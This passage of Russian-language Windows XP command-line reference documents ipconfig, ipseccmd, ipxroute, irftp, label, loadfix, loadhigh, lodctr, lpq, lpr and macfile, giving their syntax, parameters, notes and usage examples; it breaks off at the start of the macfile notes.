    Вывод полной конфигурации TCP/IP для всех адаптеров. Без этого параметра команда ipconfig выводит только IP-адреса, маску подсети и основной шлюз для каждого адаптера. Адаптеры могут представлять собой физические интерфейсы, такие как установленные сетевые адаптеры, или логические интерфейсы, такие как подключения удаленного доступа.
/renew [адаптер]
    Обновление конфигурации DHCP для всех адаптеров (если адаптер не задан) или для заданного адаптера. Данный параметр доступен только на компьютерах с адаптерами, настроенными для автоматического получения IP-адресов. Чтобы указать адаптер, введите без параметров имя, выводимое командой ipconfig.
/release [адаптер]
    Отправка сообщения DHCPRELEASE серверу DHCP для освобождения текущей конфигурации DHCP и удаление конфигурации IP-адресов для всех адаптеров (если адаптер не задан) или для заданного адаптера. Этот адаптер отключает протокол TCP/IP для адаптеров, настроенных для автоматического получения IP-адресов. Чтобы указать адаптер, введите без параметров имя, выводимое командой ipconfig.
/flushdns
    Сброс и очистка содержимого кэша сопоставления имен DNS клиента. Во время устранения неполадок DNS эту процедуру используют для удаления из кэша записей отрицательных попыток сопоставления и других динамически добавляемых записей. 
/displaydns
    Отображение содержимого кэша сопоставления имен DNS клиента, включающего записи, предварительно загруженные из локального файла Hosts, а также последние полученные записи ресурсов для запросов на сопоставление имен. Эта информация используется службой DNS клиента для быстрого сопоставления часто встречаемых имен без обращения к указанным в конфигурации DNS-серверам.
/registerdns
    Динамическая регистрация вручную имен DNS и IP-адресов, настроенных на компьютере. Этот параметр полезен при устранении неполадок в случае отказа в регистрации имени DNS или при выяснении причин неполадок динамического обновления между клиентом и DNS-сервером без перезагрузки клиента. Имена, зарегистрированные в DNS, определяются параметрами DNS в дополнительных свойствах протокола TCP/IP. 
/showclassid адаптер
    Отображение кода класса DHCP для указанного адаптера. Чтобы просмотреть код класса DHCP для всех адаптеров, вместо параметра адаптер укажите звездочку (*). Данный параметр доступен только на компьютерах с адаптерами, настроенными для автоматического получения IP-адресов.
/setclassid адаптер [код_класса]
    Задание кода класса DHCP для указанного адаптера. Чтобы задать код класса DHCP для всех адаптеров, вместо параметра адаптер укажите звездочку (*). Данный параметр доступен только на компьютерах с адаптерами, настроенными для автоматического получения IP-адресов. Если код класса DHCP не задан, текущий код класса удаляется.
/?
    Отображение справки в командной строке.

Заметки
- Команда ipconfig является эквивалентом для командной строки команды winipcfg, имеющейся в Windows Millennium Edition, Windows 98 и Windows 95. Хотя Windows XP не имеет графического эквивалента команде winipcfg, для просмотра и обновления IP-адреса можно воспользоваться окном «Сетевые подключения». Для этого откройте окно Сетевые подключения, щелкните правой кнопкой мыши сетевое подключение, выберите команду Состояние, а затем откройте вкладку Поддержка.- Данная команда доступна только на компьютерах с адаптерами, настроенными для автоматического получения IP-адресов. Это позволяет пользователям определять, какие значения конфигурации были получены с помощью DHCP, APIPA или другой конфигурации. - Если имя адаптер содержит пробелы, его следует заключать в кавычки (т. е. "имя_адаптера"). - В именах адаптеров, задаваемых для команды ipconfig, поддерживается использование подстановочного знака звездочки (*) для задания имен, начинающихся с указанной строки или содержащих указанную строку. Например, имя Подкл* будет включать все адаптеры, начинающиеся со строки «Подкл», а имя *сет* — все адаптера, содержащие строку «сет». - Эта команда доступна, только если в свойствах сетевого адаптера в объекте Сетевые подключения в качестве компонента установлен протокол Интернета (TCP/IP).
Примеры

Чтобы вывести основную конфигурацию TCP/IP для всех адаптеров, введите:

ipconfig

Чтобы вывести полную конфигурацию TCP/IP для всех адаптеров, введите:

ipconfig /all

Чтобы обновить конфигурацию IP-адреса, назначенного DHCP-сервером, только для адаптера Подключение по локальной сети, введите:

ipconfig /renew "Подключение по локальной сети"

Чтобы сбросить кэш сопоставления имен DNS при наличии неполадок в сопоставлении имен, введите:

ipconfig /flushdns

Чтобы вывести код класса DHCP для всех адаптеров с именами, начинающимися со слова Подключение, введите:

ipconfig /showclassid Подключение*

Чтобы задать код класса DHCP TEST для адаптера Подключение по локальной сети, введите:

ipconfig /setclassid "Подключение по локальной сети" TEST
========================================================================================
Ipseccmd

Служит для настройки политик IPSec (Internet Protocol Security) в службе каталогов либо в локальном или удаленном реестре. Ipseccmd является альтернативой для командной строки оснастке консоли MMC «Политики безопасности IP». Ipseccmd имеет три режима: динамический, статический и режим запроса.

Чтобы просмотреть синтаксис команды, щелкните команду:

Динамический режим ipseccmd

Динамический режим Ipseccmd служит для добавления анонимных правил в имеющуюся политику безопасности IPSec путем добавления их в базу данных политик безопасности IPSec. Добавленные правила будут присутствовать даже после перезапуска службы «Службы IPSEC». Преимуществом использования динамического режима является сосуществование добавляемых правил с политикой IPSec домена. По умолчанию используется динамический режим Ipseccmd.
Синтаксис
- Для добавления правила используется следующий синтаксис:

ipseccmd [\\имя_компьютера] -f список_фильтров [-n список_политик_согласования] [-t адрес_туннеля] [-a список_способов_пров_подлинности] [-1s список_методов_безопасности] [-1k параметры_смены_ключа] [-1p] [-1f список_фильтров_осн_режима] [-1e срок_действия] [-soft] [-confirm] [{-dialup | -lan}]
- Для удаления всех динамических политик используется следующий синтаксис:

ipseccmd -u
Параметры

\\имя_компьютера
    Имя локального или удаленного компьютера, на который требуется добавить правило. 
-f список_фильтров
    Необходим в первом случае. Одно или несколько определений фильтра, разделенных пробелами, для быстрого режима сопоставления безопасности. Каждое определение фильтра включает набор сетевого трафика, к которому относится это правило.
-n список_политик_согласования
    Один или несколько методов безопасности, разделенных пробелами, для защиты трафика, определенного списком фильтров.
-t адрес_туннеля
    Конечная точка туннеля для режима туннеля, заданная как IP-адрес или имя в системе DNS.
-a список_способов_пров_подлинности
    Один или несколько способов проверки подлинности, разделенных пробелами.
-1s список_методов_безопасности
    Один или несколько методов обеспечения безопасности при обмене ключами, разделенных пробелами.
-1k параметры_смены_ключа
    Параметры смены ключа в основном режиме сопоставления безопасности.
-1p
    Включение основного ключа безопасной пересылки.
-1f список_фильтров_осн_режима
    Одно или несколько определений фильтров для сопоставлений безопасности основного режима, разделенных пробелами.
-1e срок_действия
    Срок действия мягких сопоставлений безопасности в секундах.
-soft
    Включение мягких сопоставлений безопасности.
-confirm
    Запрос подтверждения перед добавлением правила или политики.
{-dialup | -lan}
    Применение правила только к подключениям удаленного доступа и подключениям через телефон либо к подключениям через локальную сеть.
-u
    Необходим во втором случае. Удаление всех динамических правил.
/?
    Отображение справки в командной строке.

Заметки
- Команду Ipseccmd нельзя использовать для настройки правил на компьютерах, работающих под управлением Windows 2000. - Если не задан параметр имя_компьютера, правило будет применено к локальному компьютеру. - Если используется параметр имя_компьютера, его необходимо задавать перед всеми остальными параметрами, а также обладать правами администратора на компьютере, в политику которого требуется добавить правило. - Для параметра -f определение фильтра представляет собой один или несколько фильтров, разделенных пробелами и представленных в следующем формате:

исходный_адрес/исходная_маска:исходный_порт=конечный_адрес/конечная_маска:конечный_порт:протокол
- Значения исходная_маска, исходный_порт, конечная_маска и конечный_порт являются необязательными. Если они не указаны, в фильтре будет использована маска 255.255.255.255 и все порты. - Значение протокол является необязательным. Если оно не указано, в фильтре будут использованы все протоколы. Если протокол задан, необходимо также задать порт либо поставить перед протоколом два двоеточия (::). (См. первый пример для динамического режима.) Протокол должен быть последним элементом фильтра. Можно использовать следующие обозначения протоколов: ICMP, UDP, RAW или TCP. - Заменяя знак «равно» (=) знаком «плюс» (+), можно создавать отраженные фильтры. - Значения исходный_адрес/исходная_маска или конечный_адрес/конечная_маска можно заменять значениями из следующей таблицы.
Значение     Описание
0     Локальный адрес или локальные адреса
*     Любой адрес
DNS-имя     DNS-имя домена. Если DNS-имени сопоставлено несколько адресов, оно не учитывается.
Код GUID     Глобальный уникальный идентификатор (GUID) интерфейса локальной сети в форме {12345678-1234-1234-1234-123456789ABC}. Задание кода GUID не поддерживается при использовании параметра -n в статическом режиме.
- Задав определение фильтра default, можно включить правило отклика по умолчанию. - Разрешающий фильтр можно задать, заключив определение фильтра в скобки. Блокирующий фильтр можно задать, заключив определение фильтра в квадратные скобки ([ ]). - Если для адресов Интернета используются маски подсети на основе классов (маски подсети, определенные границами октетов), для задания масок подсети можно использовать подстановочные знаки. Например, 10.*.*.* является тем же, что и 10.0.0.0/255.0.0.0, а 10.92.*.* — тем же, что и 10.92.0.0/255.255.0.0.

Примеры фильтров

Чтобы создать отраженные фильтры для фильтрации TCP-трафика между Computer1 и Computer2, введите:

Computer1+Computer2::TCP

Чтобы создать фильтр для всего TCP-трафика из подсети 172.31.0.0/255.255.0.0, порт 80, в подсеть 10.0.0.0/255.0.0.0, порт 80, введите:

172.31.0.0/255.255.0.0:80=10.0.0.0/255.0.0.0:80:TCP

Чтобы создать отраженный фильтр для передачи трафика между локальным IP-адресом и IP-адресом 10.2.1.1, введите:

(0+10.2.1.1)
- Для параметра -n одна или несколько политик согласования разделяются пробелами и задаются в одной из следующих форм: - esp[алг_шифрования,алг_пров_подлинности]смена_ключаPFS[группа] - ah[алг_хеширования] - ah[алг_хеширования]+esp[алг_шифрования,алг_пров_подлинности]

где алг_шифрования может иметь значение none, des или 3des, алг_пров_подлинности может иметь значение none, md5 или sha, а алг_хеширования может иметь значение md5 или sha.
- Конфигурация esp[none,none] не поддерживается. - Параметр sha соответствует алгоритму хеширования SHA1. - Параметр смена_ключа необязателен, и он задает количество килобайт (на что указывает буква K после числа) или количество секунд (на что указывает буква S после числа), после которых происходит смена ключа сопоставления безопасности в быстром режиме. Чтобы указать оба параметра смены ключа, разделите два числа косой чертой (/). Например, чтобы ключ в быстром режиме сопоставления безопасности сменялся через каждый час и через каждые 5 мегабайт данных, введите:

3600S/5000K
- Параметр PFS является необязательным, он включает сеансовые циклы безопасной пересылки. По умолчанию сеансовые циклы безопасной пересылки отключены - Параметр группа является необязательным, он включает группу Диффи-Хелмана для сеансовых циклов безопасной пересылки. Для низкой группы (1) Диффи-Хелмана следует задавать значение PFS1 или P1. Для средней группы (2) Диффи-Хелмана следует задавать значение PFS2 или P2. По умолчанию значение группы сеансовых циклов безопасной пересылки берется из текущих параметров основного режима. - Если не заданы политики согласования, по умолчанию используются следующие политики согласования: - esp[3des,sha] - esp[3des,md5] - esp[des,sha] - esp[des,md5] - Если параметр -t не задан, используется режим транспорта IPSec. - Для параметра -a один или несколько способом проверки подлинности разделяются пробелами и задаются в одной из следующих форм: - preshare:"строка_общего_ключа" - kerberos - cert:"центр_серт"

Параметр строка_общего_ключа задает строку знаков общего ключа. Параметр центр_серт задает отличительное имя сертификата, отображаемое в окне оснастки «Политики безопасности IP», когда этот сертификат выбран в качестве способа проверки подлинности для правила. Регистр в значениях параметров строка_общего_ключа и центр_серт имеет значение. Название способа можно сокращать, указывая только первую букву: p, k или c. Если параметр -a не задан, по умолчанию используется способ проверки подлинности Kerberos.
- Для параметра -1s один или несколько методов безопасности смены ключа разделяются пробелами и задаются в следующем формате:

алг_шифрования-алг_хеширования-номер_группы

где алг_шифрования может иметь значение des или 3des, алг_хеширования может иметь значение md5 или sha, а номер_группы может иметь значение 1 для низкой (1) группы Диффи-Хелмана или 2 для средней (2) группы Диффи-Хелмана. Если параметр -1s не задан, по умолчанию используются методы безопасности смены ключа 3des-sha-2, 3des-md5-2, des-sha-1 и des-md5-1.
- Для параметра -1k можно задать количество сопоставлений безопасности быстрого режима (на что указывает буква Q после числа) или количество секунд (на что указывает буква S после числа), после которых происходит смена ключа сопоставления безопасности в основном режиме. Чтобы указать оба параметра смены ключа, разделите два числа косой чертой (/). Например, чтобы ключ в основном режиме сопоставления безопасности сменялся через каждые 10 сопоставлений безопасности быстрого режима и через каждый час, введите:

10Q/3600S

Если параметр -1k не задан, по умолчанию смена ключа для основного режима происходит через неограниченное количество сопоставлений безопасности быстрого режима и через каждые 480 минут.
- По умолчанию основной ключ безопасной пересылки отключен. - Для параметра -1f синтаксис задания определения фильтра основного режима тот же, что и для параметра -f, за исключением того, что нельзя задавать разрешающие фильтры, блокирующие фильтры, порты и протоколы. Если параметр -1f не задан, фильтры основного режима создаются автоматически на основе фильтров быстрого режима.- Если параметр -1e не задан, срок действия для мягких сопоставлений безопасности равен 300 секунд. Однако, если не задан параметр -soft, мягкие сопоставления безопасности отключены. - Подтверждение доступно только в динамическом режиме. - Если не задан ни параметр -dialup, ни параметр -lan, правило будет применено ко всем адаптерам.
Примеры

Чтобы создать правило, использующее заголовок проверки подлинности (AH) с хешированием MD5 для всего входящего и исходящего трафика локального компьютера, введите:

ipseccmd -f 0+* -n ah[md5]

Чтобы создать правило туннеля для трафика с адресов 10.2.1.1 и 10.2.1.13 с использованием конечной точки туннеля 10.2.1.13, режимом туннеля AH с использованием алгоритма хеширования SHA1 и включенным основным ключом безопасной пересылки, а также с выдачей запроса перед созданием правила, введите:

ipseccmd -f 10.2.1.1=10.2.1.13 -t 10.2.1.13 -n ah[sha] -1p -c

Чтобы создать правило на компьютере corpsrv1 для всего трафика между компьютерами corpsrv1 и corpsrv2 с использованием сочетания AH и ESP (Encapsulating Security Payload) и проверкой подлинности с помощью общего ключа, введите:

ipseccmd \\corpsrv1 -f corpsrv2+corpsrv1 -n ah[md5]+esp[des,sha] -a p:"corpauth"

Статический режим ipseccmd

Статический режим Ipseccmd служит для создания именованных политик и именованных правил. Используя статический режим, также можно изменять имеющиеся политики и правила, если они созданы с помощью Ipseccmd. Синтаксис статического режима объединяет синтаксис динамического режима с параметрами, позволяющими ему работать на уровне политики.
Синтаксис

ipseccmd параметры_динамического_режима -w тип[:расположение] -p имя_политики[:интервал_опроса] -r имя_правила [{-x | -y}] [-o]
Параметры

параметры_динамического_режима
    Обязательный параметр. Задает набор описанных ранее параметров динамического режима для правила IPSec.
-w тип[:расположение]
    Обязательный параметр. Задает запись политик и правил в локальный реестр, реестр удаленного компьютера или домен Active Directory.
-p имя_политики[:интервал_опроса]
    Обязательный параметр. Задает имя политики и интервал ее обновления в минутах. Если значение имя_политики содержит пробелы, его следует заключать в кавычки (т. е. "имя_политики"). 
-r имя_правила
    Обязательный параметр. Задает имя правила. Если значение имя_правила содержит пробелы, его следует заключать в кавычки (т. е. "имя_правила").
[{-x | -y}]
    Назначение политики локального реестра. Параметр -x задает назначение политики локального реестра. Параметр -у отменяет назначение политики локального реестра.
-o
    Удаление правила или политики.
/?
    Отображение справки в командной строке.

Заметки
- Для параметра -w атрибут тип должен иметь значение reg для выбора реестра локального или удаленного компьютера либо значение ds для выбора Active Directory.- Если атрибут тип имеет значение reg, но значение расположение не задано, правило будет создано в реестре локального компьютера.- Если атрибут тип имеет значение reg и в качестве атрибута расположение задано имя удаленного компьютера, правило будет создано в реестре этого удаленного компьютера.- Если атрибут тип имеет значение ds, но значение расположение не задано, правило будет создано в домене Active Directory, в который входит локальный компьютер.- Если атрибут тип имеет значение ds и в качестве атрибута расположение задан домен Active Directory, правило будет создано в этом домене. - Если политика, заданная в параметре -p, уже существует, указанное правило будет добавлено в эту политику. В противном случае будет создана политика с указанным именем. Если в качестве интервала_опроса задано целое число, для данной политики будет установлен этот интервал опроса в минутах. - Если правило, имя которого задано в параметре -r, уже существует, оно будет изменено в соответствии с заданными параметрами. Например, если включить параметр -f для имеющегося правила, будут заменены только фильтры этого правила. Если правила с указанным именем не существует, оно будет создано. - Если задан параметр -o, все параметры указанной политики будет удалены. Не используйте этот параметр, если имеются другие политики, ссылающиеся на объекты в политике, которую требуется удалить. -

Использование статического режима отличается от использования динамического режима в одном отношении. В динамическом режиме разрешающие и блокирующие фильтры задаются в списке_фильтров, следующем за параметром -f. В статическом режиме разрешающие и блокирующие фильтры задаются в списке_политик_согласования, следующем за параметром -n. Вдобавок к параметрам динамического режима, описанным в списке_политик_согласования, в статическом режиме также можно использовать параметры block, pass и inpass. В следующей таблице приведена таблица со списком и описанием этих параметров.

           Параметр                         Описание
           block    Остальные политики в списке_политик_согласования не
                    учитываются, а все фильтры считаются блокирующими.
           pass     Остальные политики в списке_политик_согласования не
                    учитываются, а все фильтры считаются разрешающими.
                    Фильтры входящего трафика позволяют сначала устанавливать
           inpass   небезопасное подключение, но все последующие ответы будут
                    безопасными с использованием IPSec.

Примеры

Чтобы создать политику «Политика домена» с 30-минутным интервалом обновления в домене Active Directory, членом которого является локальный компьютер, с правилом «Безопасные серверы» для трафика между локальным компьютером и компьютерами SecuredServer1 и SecuredServer2 с использованием способов проверки подлинности Kerberos и общим ключом, введите:

ipseccmd -f 0+SecuredServer1 0+SecuredServer2 -a k p:"corpauth" -w ds -p "Политика домена":30 -r "Безопасные серверы"

Чтобы создать и назначить локальную политику «Весь трафик» и правило «Защита трафика», используя отраженный фильтр, всему трафику локального компьютера с использованием общего ключа в качестве способа проверки подлинности, введите:

ipseccmd -f 0+* -a p:"localauth" -w reg -p "Весь трафик" -r "Защита трафика" -x

Режим запроса ipseccmd

Режим запроса Ipseccmd служит для просмотра данных из базы данных политик безопасности IPSec.
Синтаксис

ipseccmd [\\имя_компьютера] show {{[filters] | [policies] | [auth] | [stats] | [sas]} | all}
Параметры

\\имя_компьютера
    Имя удаленного компьютера, данные которого требуется просмотреть. 
show
    Обязательный параметр. Запуск Ipseccmd в режиме запроса.
filters
    Отображение фильтров основного и быстрого режимов.
policies
    Отображение политик основного и быстрого режимов.
auth
    Отображение способов проверки подлинности основного режима.
stats
    Отображение статистики протоколов IKE и IPSec.
sas
    Отображение сопоставлений безопасности основного и быстрого режимов.
all
    Отображение всех данных.
/?
    Отображение справки в командной строке.

Заметки
- Команду Ipseccmd нельзя использовать для отображения данных IPSec на компьютерах, работающих под управлением Windows 2000. - Если параметр имя_компьютера не задан, отображаются сведения о локальном компьютере. - Если используется параметр имя_компьютера, его необходимо задавать перед всеми остальными параметрами, а также обладать правами администратора на компьютере, данные которого требуется просмотреть.
Примеры

Для отображения фильтров и политик основного и быстрого режимов локального компьютера введите:

ipseccmd show filters policies

Для отображения всех сведений IPSec удаленного компьютера Server1 введите:

ipseccmd \\Server1 show all
========================================================================================
Ipxroute

Служит для отображения и изменения таблицы маршрутизации протокола IPX. При вызове команды ipxroute без параметров отображаются используемые по умолчанию параметры пакетов, отправляемых на неизвестные и широковещательные адреса, а также адреса многоадресной рассылки.
Синтаксис

ipxroute servers [/type=x]

ipxroute ripout сеть

ipxroute resolve {guid | name} {код_guid | имя_адаптера}

ipxroute board=число [def] [gbr] [mbr] [remove=xxxxxxxxxxxx]

ipxroute config
Параметры

servers [/type=x]
    Вывод таблицы точки доступа к службе (Service Access Point, SAP) для указанного типа сервера. X должно быть целым числом. Например, при задании параметра /type=4 выводятся все файловые серверы. Если не задать параметр /type, будут выведен список серверов всех типов, отсортированный по имени.
ripout сеть
    Определение достижимости сети путем проверки таблицы маршрутизации стека IPX и отправки запроса rip при необходимости. Сеть представляет собой номер сегмента сети IPX .
resolve {guid | name} {код_guid | имя_адаптера}
    Разрешение кода GUID в понятное имя или наоборот.
board=число
    Сетевой адаптер, у которого запрашиваются или которому передаются данные.
def
    Отправка пакетов по широковещательной рассылке ALL ROUTES. Если пакет передается по уникальному аппаратному адресу, который отсутствует в исходной таблице маршрутов, по умолчанию используется одноадресная рассылка SINGLE ROUTES.
gbr
    Отправка пакетов по широковещательной рассылке ALL ROUTES. Если пакет передается по широковещательному адресу (FFFFFFFFFFFF), по умолчанию передается широковещательный пакет SINGLE ROUTES.
mbr
    Отправка пакетов по широковещательной рассылке ALL ROUTES. Если пакет передается по адресу многоадресной рассылки (C000xxxxxxxx), по умолчанию передается широковещательный пакет SINGLE ROUTES.
remove=xxxxxxxxxxxx
    Удаление адреса указанного узла из исходной таблицы маршрутов.
config
    Отображение сведений о всех сетевых привязках, на работу с которыми настроен протокол IPX.
/?
    Отображение справки в командной строке.

Примеры
Чтобы просмотреть сегменты сети, в которые входит данная рабочая станция, адрес узла рабочей станции и используемый тип кадра, введите следующую команду:

ipxroute config
========================================================================================
Irftp

Служит для отправки файлов по инфракрасной связи При вызове команды irftp без параметров или с параметром /s открывается диалоговое окно Инфракрасная связь, позволяющее выбрать файлы для отправки, не пользуясь командной строкой.
Синтаксис

irftp [диск:\] [[путь] имя_файла] [/h]

irftp /s
Параметры

диск:\
    Диск, содержащий файлы, которые требуется отправить по инфракрасной связи. 
[путь] имя_файла
    Расположение и имя файла для отправки по инфракрасной связи. При задании нескольких файлов необходимо указывать полный путь к каждому файлу. 
/h
    Включение скрытого режима. Когда используется скрытый режим, передача файлов выполняется без отображения диалогового окна Инфракрасная связь.
/s
    Открытие диалогового окна Инфракрасная связь, позволяющего выбрать один или несколько файлов для отправки без использования командной строки.

Заметки
- Прежде чем использовать эту команду, убедитесь, что передающее и принимающее устройства обладают функционирующими инфракрасными портами и что между этими устройствами установлена инфракрасная связь.
Примеры

Чтобы отправить документ Microsoft Word РабочийДокумент, расположенный в папке РабочиеФайлы (на диске C исходного компьютера), на другой компьютер, введите:

irftp C:\РабочиеФайлы\РабочийДокумент.doc /h
Чтобы отправить два документа Microsoft Word — РабочийДокумент1 и РабочийДокумент2 — расположенные в папке РабочиеФайлы (на диске C исходного компьютера), на другой компьютер, введите:

irftp C:\РабочиеФайлы\РабочийДокумент1.doc C:\РабочиеФайлы\РабочийДокумент2.doc /h

В этом примере используется скрытый режим, поэтому диалоговое окно Инфракрасная связь открываться не будет.
========================================================================================
Label

Служит для создания, изменения или удаления метки тома (т. е. имени) диска. Команда label без параметров используется для изменения текущей метки тома или ее удаления.
Синтаксис

label [диск:][метка]

label [/MP][том][метка]
Параметры

диск:
    Буква диска (за которой следует двоеточие), имя которого требуется изменить.
метка
    Имя тома.
/MP
    Рассмотрение тома как точки подключения или имени тома.
том
    Буква диска (за которой следует двоеточие), точка подключения или имя тома. Если задано имя тома, параметр /MP указывать не нужно..
/?
    Отображение справки в командной строке.

Заметки
- В Windows метка тома выводится в как часть сведений о каталоге. Если существует серийный номер диска, он также отображается в Windows.- Сообщения команды Label

Если при вызове команды label метка не задана, на экран будет выведено сообщение в следующем формате:

Том в устройстве A имеет метку xxxxxxxxxxx
Серийный номер тома: xxxx-xxxx
Метка тома (11 символов, ENTER - метка не нужна):

Сообщение «Серийный номер тома» выводится, только если диск имеет серийный номер.

После сообщения можно ввести новую метку тома или нажать клавишу ENTER для удаления текущей метки тома. Если диск имел метку тома и была нажата клавиша ENTER для его удаления, будет выведен следующий запрос на подтверждение:

Удалить текущую метку тома [Y(да)/N(нет)]?

Для удаления метки следует нажать Y, для отказа от удаления — N.
- Ограничения на имена меток томов

Метка тома может содержать до 32 знаков для файловой системы NTFS или до 11 знаков для файловой системы FAT и может содержать пробелы (но не знаки табуляции).

Метки томов с файловой системой FAT не могут содержать следующие символы:

* ? / \ | . , ; : + = [ ] < > "

Эти ограничения не применяются к томам NTFS.

На томах FAT метки хранятся в верхнем регистре независимо от регистра букв веденной строки. Метка тома файловой системы NTFS будет выводиться так, как она была введена.
Примеры

Чтобы присвоить диску A метку, введите:

label a:метка диска
========================================================================================
Loadfix

Служит для загрузки программы выше первых 64 Кбайт обычной памяти и запуска этой программы.
Синтаксис

loadfix[диск:][путь] имя_файла
Параметры

[диск:][путь]
    Диск и каталог, в котором расположена программа.
имя_файла
    Имя программы.
/?
    Отображение справки в командной строке.

Заметки
- Чтобы использовать команду loadfix, ее следует включить в начало командной строки вызова программы. - Когда вся программа или ее часть загружена в первые 46 КБ обычной памяти и ее выполнение невозможно, некоторые программы выводят следующее сообщение:

Packed file corrupt

Как правило, эта ошибка возникает, когда драйверы устройств загружаются в верхнюю область памяти, оставляя первые 64Кб обычной памяти для использования программами. Если данное сообщение появляется на экране, следует использовать команду loadfix для обеспечения загрузки программы выше первых 64Кб обычной виртуальной памяти.
Примеры

Чтобы загрузить программу Myapp.exe (из папки Apps на диске C) с использованием параметра командной строки /c (например, чтобы загрузить программу в символьном режиме), введите:

loadfix c:\apps\myapp.exe /c

Эту команду также можно включить в пакетную программу.
========================================================================================
Loadhigh

Служит для загрузки программы в верхнюю область памяти. Это позволяет оставить больше свободной обычной памяти для других программ. Для указания программы, которую требуется загрузить в верхнюю область памяти, используйте файл системный_корневой_каталог\System32\Config.nt или эквивалентный файл запуска.
Синтаксис

loadhigh [диск:][путь] имя_файла [параметры]
Параметры

[диск:][путь] имя_файла
    Местоположение и имя программы, которая будет загружена. Параметр имя_файла является обязательным.
параметры
    Параметры командной строки, используемые программой.
/?
    Отображение справки в командной строке.

Заметки
- Для использования команды loadhigh в файл Config.nt или другой эквивалентный файл должна быть включена команда dos=umb. Чтобы получить дополнительные сведения о команде dos=umb, выберите dos из списка в ссылке «».- Для загрузки программ в верхнюю область памяти вначале необходимо установить диспетчер расширенной памяти Himem.sys. Для этого используется команда device в файле Config.nt или эквивалентном загрузочном файле.- Если для загрузки программы используется команда loadhigh, система Windows XP попытается загрузить ее в верхнюю область памяти. Если в верхней области памяти недостаточно места, программа будет загружена в обычную память, но никаких сообщений об этом не выводится.- Наиболее подходящим вариантом использования команды loadhigh является ее включение в файл Autoexec.nt или эквивалентный загрузочный файл.
Примеры

Для загрузки драйвера в верхнюю область памяти в файл Autoexec.nt или эквивалентный загрузочный файл следует включить следующую строку:

lh %systemroot%\system32\dosx
========================================================================================
Lodctr

Служит для регистрации имен новых счетчиков производительности и текста объяснения для службы или драйвера устройства, а также для сохранения и восстановления значений счетчика и текста объяснения.
Синтаксис

lodctr [\\имя_компьютера] имя_файла [/s:имя_файла] [/r:имя_файла]
Параметры

[\\имя_компьютера] имя_файла
    Регистрация параметров имени счетчика производительности и текста объяснения, содержащихся в файле инициализации имя_файла. Если не указано имя_компьютерапо умолчанию командой lodctr будет использоваться локальный компьютер.
/s:имя_файла
    Сохранение параметров реестра счетчика производительности и объясняющего текста в файле имя_файла.
/r:имя_файла
    Восстановление параметров реестра счетчика производительности и объясняющего текста из файла имя_файла.

    Внимание!
    - Если используется команда lodctr /r, параметры реестра счетчика производительности и объясняющий текст будут заменены данными из указанного файла. 
/?
    Отображение справки в командной строке.

Заметки
- Если аргументы параметров команды содержат пробелы, их следует заключать в кавычки (например "имя компьютера").
Примеры

Чтобы сохранить текущие параметры реестра производительности и текст объяснения счетчика в файл perf backup1.txt, введите:

lodctr /s:"perf backup1.txt"
========================================================================================
Lpq

Служит для отображения состояния очереди печати на компьютере, использующем программное обеспечение сервера печати Line Printer Daemon (LPD). При вызове команды lpq без параметров в командной строке отображается справка по команде lpq.
Синтаксис

lpq -S имя_сервера -P имя_принтера [-l]
Параметры

-S имя_сервера
    Обязательный параметр. Имя компьютера, на котором находится очередь печати, состояние которой требуется просмотреть.
-P имя_принтера
    Обязательный параметр. Имя принтера, состояние очереди печати которого требуется просмотреть.
-l
    Отображение сведений о состоянии очереди печати.
/?
    Отображение справки в командной строке.

========================================================================================
Lpr

Служит для отправки файла на компьютер, использующий программное обеспечение сервера печати Line Printer Daemon (LPD), для подготовки к печати. При вызове команды lpr без параметров в командной строке отображается справка по команде lpr.
Синтаксис

lpr [-S сервера] -P имя_принтера [-C титульный_лист] [-J имя_задания] [{-o | -o l}] [-d] [-x] имя_файла
Параметры

-S сервера
    Имя или IP-адрес компьютера, к которому подключен принтер, на котором требуется напечатать файл. Этот параметр не следует задавать, если принтер подключен к локальному компьютеру.
-P имя_принтера
    Обязательный параметр. Имя принтера, на котором требуется напечатать файл.
-C титульный_лист
    Текст для печати на титульном листе задания печати. Если этот параметр не задан, на титульном листе будет напечатано имя компьютера, с которого поступило задание печати. 
-J имя_задания
    Имя задания, которое будет напечатано на титульной странице. Если этот параметр не задан, на титульной странице будет напечатано имя файла. 
{-o | -o l}
    Тип файла, который требуется напечатать. Параметр -o задает печать текстового файла. Параметр -o l задает печать двоичного файла (например PostScript). 
-d
    Отправка файла данных перед управляющим файлом. Этот параметр следует использовать, если сначала требуется отправить файл данных. Дополнительные сведения можно найти в документации по принтеру.
-x
    Включение совместимости команды lpr с операционной системой Sun Microsystems, выпуски которой до версии 4.1.4_u1 включительно назывались SunOS. 
имя_файла
    Обязательный параметр. Имя файла, который требуется напечатать.
/?
    Отображение справки в командной строке.

Заметки
- Чтобы найти имя принтера, откройте папку «Принтеры и факсы». ========================================================================================
Macfile

Команда Macfile служит для управления серверами, томами, папками и файлами файлового сервера для «Макинтоша» из командной строки. Административные задачи могут быть автоматизированы включением последовательностей команд в пакетные файлы и запуском этих файлов вручную или в заранее определенное время.

Изменение каталогов тома, доступного для «Макинтоша»
Синтаксис

macfile directory [/server:\\имя_компьютера] /path:папка [/owner:имя_владельца] [/group:имя_группы] [/permissions:разрешения]
Параметры

/server:\\имя_компьютера
    Сервер, на котором требуется изменить папку. Если данный параметр не задан, эта операция выполняется на локальном компьютере.
/path:папка
    Обязательный параметр. Путь к папке, которую требуется изменить. Указанная папка должна существовать. Команда macfile directory не позволяет создавать папки.
/owner:имя_владельца
    Смена владельца папки. Если данный параметр не задан, владелец остается прежним.
/group:имя_группы
    Задание или изменение основной группы «Макинтоша», связанной с этой папкой. Если данный параметр не задан, основная группа не изменяется.
/permissions:разрешения
    Задание разрешений на папку для владельца, основной группы и всех остальных. Для настройки разрешений используется число, содержащее 11 знаков. Цифра 1 означает разрешение; 0 — его отмену (например 11111011000). Позиция цифры соответствует определенному разрешению в соответствии со следующей таблицей. Если данный параметр не задан, разрешения не изменяются.
    Позиция     Установка разрешения
    Первая     OwnerSeeFiles
    Вторая     OwnerSeeFolders
    Третья     OwnerMakeChanges
    Четвертая     GroupSeeFiles
    Пятая     GroupSeeFolders
    Шестая     GroupMakeChanges
    Седьмая     WorldSeeFiles
    Восьмая     WorldSeeFolders
    Девятая     WorldMakeChanges
    Десятая     Папка не может быть переименована, перемещена, или удалена.
    Одиннадцатая     Изменения применяются к текущей папке и всем ее подпапкам.
/?
    Отображение справки в командной строке.

Заметки
